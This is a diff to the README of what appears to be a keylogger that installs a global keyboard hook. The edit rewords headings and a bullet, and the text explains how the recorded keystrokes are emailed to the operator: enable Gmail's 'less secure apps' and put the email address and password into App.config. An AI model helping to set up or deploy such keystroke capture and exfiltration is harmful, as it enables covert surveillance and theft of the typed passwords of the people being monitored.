@@ -7,9 +7,9 @@ When a session is launched, a global hook is installed on the computer using the
 ## How do I recover the recorded keystrokes?
 You have two options
 * Manually recover the saved files from the computer itself 
-* Utilize the inbuilt emailing function to email yourself the recorded keystrokes once a day.
+* Recover the keystrokes via email.
 
-## How do I use the inbuilt email function?
+## How do I recover the keystrokes via email?
 * Allow your email account to access "less secure apps" in other words allow it to send emails using an SMTP library - https://www.google.com/settings/security/lesssecureapps (if you are using a gmail account)
 * Open App.config and change the value of "email" to your email address and the value of "password" to your email password
 
